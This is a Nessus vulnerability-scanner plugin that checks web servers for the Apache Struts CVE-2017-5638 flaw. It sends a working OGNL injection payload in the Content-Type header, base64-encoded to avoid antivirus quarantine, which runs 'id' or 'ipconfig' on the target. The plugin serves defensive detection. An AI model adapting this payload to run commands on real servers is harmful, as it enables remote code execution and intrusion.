#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(97610);
  script_version("1.25");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2017-5638");
  script_bugtraq_id(96729);
  script_xref(name:"CERT", value:"834067");
  script_xref(name:"EDB-ID", value:"41570");
  script_xref(name:"EDB-ID", value:"41614");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/05/03");

  script_name(english:"Apache Struts 2.3.5 - 2.3.31 / 2.5.x < 2.5.10.1 Jakarta Multipart Parser RCE (remote)");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that uses a Java
framework that is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Apache Struts running on the remote host is affected by
a remote code execution vulnerability in the Jakarta Multipart parser
due to improper handling of the Content-Type header. An
unauthenticated, remote attacker can exploit this, via a specially
crafted Content-Type header value in the HTTP request, to potentially
execute arbitrary code, subject to the privileges of the web server
user.");
  script_set_attribute(attribute:"see_also", value:"http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html");
  # https://threatpost.com/apache-struts-2-exploits-installing-cerber-ransomware/124844/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?77e9c654");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/S2-045");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Apache Struts version 2.3.32 / 2.5.10.1 or later.
Alternatively, apply the workaround referenced in the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-5638");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Struts Jakarta Multipart Parser OGNL Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:"CANVAS");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/03/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/03/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/03/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("http.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list('/');

# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp / .do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = pregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = pregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match3 = pregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match3))
    {
      urls = make_list(urls, match3[0]);
      if (!thorough_tests) break;
    }
    if (cgi =~ "struts2?(-rest)?-showcase")
    {
      urls = make_list(urls, cgi);
      if (!thorough_tests) break;
    }
  }
}
if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

urls = list_uniq(urls);

vuln = FALSE;

rand_var = rand_str(length:8);
header_payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Tenable','" + rand_var + "')}.multipart/form-data";
headers_1 = make_array("Content-Type", header_payload);

# The OGNL exploit has been base64 encoded to evade AV quarantine for certain AV
# vendors.
# {'cmd.exe','/c','ipconfig','/all'}:{'bash','-c','id'}))
exploit = "JXsoI189J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZX";
exploit += "h0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJ";
exploit += "lckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1w";
exploit += "aG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpb";
exploit += "D0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi";
exploit += "5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2t";
exploit += "hZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRDbGFzc2Vz";
exploit += "KCkuY2xlYXIoKSkuKCNjb250ZXh0LnNldE1lbWJlckFjY2VzcygjZG0pKSkpLigja";
exploit += "XN3aW49KEBqYXZhLmxhbmcuU3lzdGVtQGdldFByb3BlcnR5KCdvcy5uYW1lJykudG";
exploit += "9Mb3dlckNhc2UoKS5jb250YWlucygnd2luJykpKS4oI2NtZHM9KCNpc3dpbj97J2N";
exploit += "tZC5leGUnLCcvYycsJ2lwY29uZmlnJywnL2FsbCd9OnsnYmFzaCcsJy1jJywnaWQn";
exploit += "fSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwL";
exploit += "nJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS";
exploit += "4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEB";
exploit += "nZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNv";
exploit += "bW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI";
exploit += "3JvcykpLigjcm9zLmZsdXNoKCkpfQo=";

headers_2 = make_array("Content-Type", chomp(base64_decode(str:exploit)));

# Since struts apps could be taking longer
timeout = get_read_timeout() * 2;
if(timeout < 10)
  timeout = 10;
http_set_read_timeout(timeout);

foreach url (urls)
{
  ############################################
  # Method 1
  ############################################
  res = http_send_recv3(
    method       : "GET",
    item         : url,
    port         : port,
    add_headers  : headers_1,
    exit_on_fail : TRUE
  );
  if ( ("X-Tenable: "+ rand_var ) >< res[1] )
    vuln = TRUE;
  # Stop after first vulnerable Struts app is found
  if (vuln) break;

  ############################################
  # Method 2
  ############################################

  cmd_pats = make_array();
  cmd_pats['id'] = "uid=[0-9]+.*\sgid=[0-9]+.*";
  cmd_pats['ipconfig'] = "Subnet Mask|Windows IP|IP(v(4|6)?)? Address";

  res = http_send_recv3(
    method       : "GET",
    item         : url,
    port         : port,
    add_headers  : headers_2,
    exit_on_fail : TRUE
  );

  if ("Windows IP" >< res[2] || "uid" >< res[2])
  {
    if (pgrep(pattern:cmd_pats['id'], string:res[2]))
    {
      output = strstr(res[2], "uid");
      if (!empty_or_null(output))
      {
        vuln = TRUE;
        vuln_url = build_url(qs:url, port:port);
        break;
      }
    }
    else if (pgrep(pattern:cmd_pats['ipconfig'], string:res[2]))
    {
      output = strstr(res[2], "Windows IP");
      if (!empty_or_null(output))
      {
        vuln = TRUE;
        vuln_url = build_url(qs:url, port:port);
        break;
      }
    }
  }
}


if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(http_last_sent_request()),
  output     : chomp(output)
);
